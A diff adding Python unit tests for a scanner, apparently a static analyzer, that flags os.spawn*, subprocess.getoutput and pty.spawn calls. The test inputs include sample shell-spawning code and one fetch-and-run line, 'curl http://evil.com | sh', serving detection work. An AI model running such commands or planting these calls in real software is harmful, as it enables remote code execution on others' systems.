@@ -98,3 +98,61 @@ def test_from_import_alias_detected():
     code = "from subprocess import run as subrun\nsubrun(['id'])\n"
     findings = analyzer.analyze(code, "test.py")
     assert len(findings) >= 1, "from-import alias must be detected"
+
+
+# ── #1: os.spawn* family ─────────────────────────────────────────────────────
+
+def test_detects_os_spawnl():
+    """os.spawnl() must be detected — equivalent to os.system."""
+    analyzer = SubprocessAnalyzer()
+    code = "import os\ndef run():\n    os.spawnl(os.P_WAIT, '/bin/sh', 'sh', '-c', 'id')"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1
+    assert any("spawn" in f.description for f in findings)
+
+
+def test_detects_os_spawnv_at_module_level():
+    """os.spawnv() al nivel del módulo → CRITICAL."""
+    analyzer = SubprocessAnalyzer()
+    code = "import os\nos.spawnv(os.P_WAIT, '/bin/sh', ['sh', '-c', 'curl http://evil.com | sh'])"
+    findings = analyzer.analyze(code, "test.py")
+    critical = [f for f in findings if f.severity == Severity.CRITICAL]
+    assert len(critical) >= 1
+
+
+# ── #2: subprocess.getoutput / getstatusoutput ────────────────────────────────
+
+def test_detects_subprocess_getoutput():
+    """subprocess.getoutput() must be detected — executes shell commands."""
+    analyzer = SubprocessAnalyzer()
+    code = "import subprocess\ndef run():\n    result = subprocess.getoutput('id')"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1
+    assert any(f.severity == Severity.HIGH for f in findings)
+
+
+def test_detects_subprocess_getstatusoutput():
+    """subprocess.getstatusoutput() must be detected."""
+    analyzer = SubprocessAnalyzer()
+    code = "import subprocess\ndef run():\n    code, out = subprocess.getstatusoutput('whoami')"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1
+
+
+# ── #3: pty.spawn ─────────────────────────────────────────────────────────────
+
+def test_detects_pty_spawn():
+    """pty.spawn('/bin/bash') must be detected — opens an interactive shell."""
+    analyzer = SubprocessAnalyzer()
+    code = "import pty\ndef shell():\n    pty.spawn('/bin/bash')"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1
+    assert any("pty" in f.description for f in findings)
+
+
+def test_detects_pty_spawn_aliased():
+    """import pty as p; p.spawn('/bin/bash') must be detected."""
+    analyzer = SubprocessAnalyzer()
+    code = "import pty as p\np.spawn('/bin/sh')"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1
